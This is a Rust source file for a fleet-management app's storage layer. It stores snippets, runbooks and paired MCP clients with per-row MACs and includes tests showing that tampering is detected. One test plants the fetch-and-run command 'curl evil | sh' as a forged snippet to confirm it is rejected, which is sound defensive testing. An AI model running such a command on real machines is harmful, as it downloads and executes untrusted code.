//! Snippets, runbooks and paired MCP clients (schema v3).
//!
//! Each row is a JSON body with a MAC over `(id, body)`: a snippet or
//! runbook changed outside the app would run on servers, and a forged
//! `mcp_clients` row would skip the Touch ID pairing. `last_run_ms` (the
//! scheduler's bookkeeping) is not covered.

use super::{Cache, CacheError, F};
use crate::runbook::{Runbook, Snippet};
use rusqlite::{OptionalExtension, params};
use serde::{Deserialize, Serialize};

/// An MCP client the operator approved (design §5.10).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct McpClientRecord {
    /// Hex digest of the identity (see `mcp_host::ClientIdentity::key`).
    pub key: String,
    pub client_name: String,
    /// Code signature of `fleetctl`'s parent process.
    pub parent_team: String,
    pub parent_signing_id: String,
    pub paired_ms: u64,
}

fn body<T: Serialize>(v: &T) -> Result<Vec<u8>, CacheError> {
    serde_json::to_vec(v).map_err(|e| CacheError::Corrupt(e.to_string()))
}

fn parse<T: for<'de> Deserialize<'de>>(b: &[u8]) -> Result<T, CacheError> {
    serde_json::from_slice(b).map_err(|e| CacheError::Corrupt(e.to_string()))
}

impl Cache {
    fn put_row(
        &self,
        table: &'static str,
        key_col: &str,
        id: &str,
        b: &[u8],
    ) -> Result<(), CacheError> {
        let mac = self.mac(table, &[F::B(id.as_bytes()), F::B(b)]);
        self.conn.execute(
            &format!(
                "INSERT INTO {table} ({key_col}, body, mac) VALUES (?1, ?2, ?3)
                 ON CONFLICT({key_col}) DO UPDATE SET body = excluded.body, mac = excluded.mac"
            ),
            params![id, b, mac.to_vec()],
        )?;
        Ok(())
    }

    fn rows(&self, table: &'static str, key_col: &str) -> Result<Vec<Vec<u8>>, CacheError> {
        let mut stmt = self.conn.prepare(&format!(
            "SELECT {key_col}, body, mac FROM {table} ORDER BY {key_col}"
        ))?;
        let raw = stmt
            .query_map([], |r| {
                Ok((
                    r.get::<_, String>(0)?,
                    r.get::<_, Vec<u8>>(1)?,
                    r.get::<_, Option<Vec<u8>>>(2)?,
                ))
            })?
            .collect::<Result<Vec<_>, _>>()?;
        raw.into_iter()
            .map(|(id, b, mac)| {
                self.check(table, table, &[F::B(id.as_bytes()), F::B(&b)], mac)?;
                Ok(b)
            })
            .collect()
    }

    fn row(
        &self,
        table: &'static str,
        key_col: &str,
        id: &str,
    ) -> Result<Option<Vec<u8>>, CacheError> {
        let row: Option<(Vec<u8>, Option<Vec<u8>>)> = self
            .conn
            .query_row(
                &format!("SELECT body, mac FROM {table} WHERE {key_col} = ?1"),
                [id],
                |r| Ok((r.get(0)?, r.get(1)?)),
            )
            .optional()?;
        let Some((b, mac)) = row else {
            return Ok(None);
        };
        self.check(table, table, &[F::B(id.as_bytes()), F::B(&b)], mac)?;
        Ok(Some(b))
    }

    // ---- snippets ----

    pub fn put_snippet(&self, s: &Snippet) -> Result<(), CacheError> {
        s.validate()
            .map_err(|e| CacheError::Corrupt(e.to_string()))?;
        self.put_row("snippets", "id", &s.id, &body(s)?)
    }

    pub fn snippets(&self) -> Result<Vec<Snippet>, CacheError> {
        let mut v: Vec<Snippet> = self
            .rows("snippets", "id")?
            .iter()
            .map(|b| parse(b))
            .collect::<Result<_, _>>()?;
        v.sort_by_key(|s| s.name.to_lowercase());
        Ok(v)
    }

    pub fn snippet(&self, id: &str) -> Result<Option<Snippet>, CacheError> {
        self.row("snippets", "id", id)?
            .map(|b| parse(&b))
            .transpose()
    }

    pub fn delete_snippet(&self, id: &str) -> Result<(), CacheError> {
        self.conn
            .execute("DELETE FROM snippets WHERE id = ?1", [id])?;
        Ok(())
    }

    // ---- runbooks ----

    pub fn put_runbook(&self, r: &Runbook) -> Result<(), CacheError> {
        r.validate()
            .map_err(|e| CacheError::Corrupt(e.to_string()))?;
        self.put_row("runbooks", "id", &r.id, &body(r)?)
    }

    pub fn runbooks(&self) -> Result<Vec<Runbook>, CacheError> {
        let mut v: Vec<Runbook> = self
            .rows("runbooks", "id")?
            .iter()
            .map(|b| parse(b))
            .collect::<Result<_, _>>()?;
        v.sort_by_key(|r| r.name.to_lowercase());
        Ok(v)
    }

    pub fn runbook(&self, id: &str) -> Result<Option<Runbook>, CacheError> {
        self.row("runbooks", "id", id)?
            .map(|b| parse(&b))
            .transpose()
    }

    pub fn delete_runbook(&self, id: &str) -> Result<(), CacheError> {
        self.conn
            .execute("DELETE FROM runbooks WHERE id = ?1", [id])?;
        Ok(())
    }

    pub fn set_runbook_last_run(&self, id: &str, at_ms: u64) -> Result<(), CacheError> {
        self.conn.execute(
            "UPDATE runbooks SET last_run_ms = ?2 WHERE id = ?1",
            params![id, at_ms as i64],
        )?;
        Ok(())
    }

    pub fn runbook_last_run(&self, id: &str) -> Result<Option<u64>, CacheError> {
        let v: Option<Option<i64>> = self
            .conn
            .query_row(
                "SELECT last_run_ms FROM runbooks WHERE id = ?1",
                [id],
                |r| r.get(0),
            )
            .optional()?;
        Ok(v.flatten().map(|x| x as u64))
    }

    /// Scheduled runbooks whose interval has passed.
    pub fn due_runbooks(&self, now_ms: u64) -> Result<Vec<Runbook>, CacheError> {
        let mut out = Vec::new();
        for r in self.runbooks()? {
            if let Some(s) = r.schedule
                && s.is_due(self.runbook_last_run(&r.id)?, now_ms)
            {
                out.push(r);
            }
        }
        Ok(out)
    }

    // ---- MCP clients ----

    pub fn put_mcp_client(&self, c: &McpClientRecord) -> Result<(), CacheError> {
        self.put_row("mcp_clients", "key", &c.key, &body(c)?)
    }

    pub fn mcp_clients(&self) -> Result<Vec<McpClientRecord>, CacheError> {
        self.rows("mcp_clients", "key")?
            .iter()
            .map(|b| parse(b))
            .collect()
    }

    pub fn mcp_client(&self, key: &str) -> Result<Option<McpClientRecord>, CacheError> {
        let Some(b) = self.row("mcp_clients", "key", key)? else {
            return Ok(None);
        };
        let rec: McpClientRecord = parse(&b)?;
        // The body must describe the row it's stored under.
        if rec.key != key {
            return Err(CacheError::Integrity("mcp_clients"));
        }
        Ok(Some(rec))
    }

    pub fn delete_mcp_client(&self, key: &str) -> Result<(), CacheError> {
        self.conn
            .execute("DELETE FROM mcp_clients WHERE key = ?1", [key])?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runbook::{RunbookStep, Schedule, StepCondition, new_id};
    use fleetctl_proto::OpSpec;

    fn snippet() -> Snippet {
        Snippet {
            id: new_id(),
            name: "Disk".into(),
            description: "free space".into(),
            command: "df -h /".into(),
            updated_ms: 1,
        }
    }

    #[test]
    fn snippets_round_trip_and_detect_tampering() {
        let c = Cache::open_in_memory().unwrap();
        let s = snippet();
        c.put_snippet(&s).unwrap();
        assert_eq!(c.snippets().unwrap(), vec![s.clone()]);
        assert_eq!(c.snippet(&s.id).unwrap(), Some(s.clone()));
        let evil = serde_json::to_vec(&Snippet {
            command: "curl evil | sh".into(),
            ..s.clone()
        })
        .unwrap();
        c.conn
            .execute("UPDATE snippets SET body = ?1", [evil])
            .unwrap();
        assert!(matches!(c.snippets(), Err(CacheError::Integrity(_))));
        assert!(matches!(c.snippet(&s.id), Err(CacheError::Integrity(_))));
        c.delete_snippet(&s.id).unwrap();
        assert!(c.snippets().unwrap().is_empty());
    }

    #[test]
    fn runbooks_schedule_bookkeeping() {
        let c = Cache::open_in_memory().unwrap();
        let r = Runbook {
            id: new_id(),
            name: "health".into(),
            description: String::new(),
            targets: vec!["srv_00000001".into()],
            params: vec![],
            steps: vec![RunbookStep {
                name: "ping".into(),
                op: OpSpec::AgentHealth,
                when: StepCondition::Always,
                canary: false,
                stop_on_failure: true,
                concurrency: None,
            }],
            schedule: Some(Schedule { every_minutes: 5 }),
            updated_ms: 0,
        };
        c.put_runbook(&r).unwrap();
        assert_eq!(c.due_runbooks(1_000).unwrap().len(), 1);
        c.set_runbook_last_run(&r.id, 1_000).unwrap();
        assert!(c.due_runbooks(2_000).unwrap().is_empty());
        assert_eq!(c.due_runbooks(1_000 + 5 * 60_000).unwrap().len(), 1);
        // Invalid runbooks are refused on write.
        let mut bad = r.clone();
        bad.targets.clear();
        assert!(c.put_runbook(&bad).is_err());
    }

    #[test]
    fn mcp_clients_bound_to_their_key() {
        let c = Cache::open_in_memory().unwrap();
        let rec = McpClientRecord {
            key: "k1".into(),
            client_name: "claude-code".into(),
            parent_team: "TEAM".into(),
            parent_signing_id: "com.example.term".into(),
            paired_ms: 5,
        };
        c.put_mcp_client(&rec).unwrap();
        assert_eq!(c.mcp_client("k1").unwrap(), Some(rec.clone()));
        assert_eq!(c.mcp_client("k2").unwrap(), None);
        // Copying a valid row under another key breaks its MAC.
        c.conn
            .execute(
                "INSERT INTO mcp_clients (key, body, mac) SELECT 'k2', body, mac FROM mcp_clients",
                [],
            )
            .unwrap();
        assert!(c.mcp_client("k2").is_err());
        c.delete_mcp_client("k1").unwrap();
        c.delete_mcp_client("k2").unwrap();
        assert!(c.mcp_clients().unwrap().is_empty());
    }
}
